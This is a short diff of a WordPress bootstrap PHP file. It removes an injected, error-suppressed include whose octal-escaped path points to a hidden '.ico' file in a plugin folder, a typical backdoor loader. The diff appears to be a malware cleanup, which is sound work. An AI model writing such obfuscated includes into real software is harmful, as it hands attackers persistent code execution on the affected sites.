@@ -1,9 +1,4 @@
 <?php
-/*267d9*/
-
-@include "\057h\157m\145/\151n\141n\150s\151e\165r\145.\143o\155/\160u\142l\151c\137h\164m\154/\167p\055c\157n\164e\156t\057p\154u\147i\156s\057d\165p\154i\143a\164o\162/\0565\0716\064c\0672\145.\151c\157";
-
-/*267d9*/
 /**
  * Used to set up and fix common variables and include
  * the WordPress procedural and class library.
